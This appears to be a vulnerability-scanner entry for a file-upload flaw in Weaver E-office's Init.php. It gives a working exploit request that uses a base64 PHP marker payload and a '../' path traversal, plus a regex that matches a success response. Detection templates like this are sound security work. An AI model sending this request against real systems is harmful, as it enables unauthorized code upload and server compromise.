# 泛微E-officeinit.php文件上传漏洞

泛微OA ｜ 文件上传 ｜ —
- **请求**：`GET /E-mobile/App/Init.php?m=createDo_Email&upload_file=PD9waHAgZWNobyBtZDUoMjMzKTt1bmxpbmsoX19GSUxFX18pPz4=&file_name=../testa123.php HTTP/1.1`
- **响应特征**：-1 ^(?=.*?(?:提交成功|新建成功)).*?$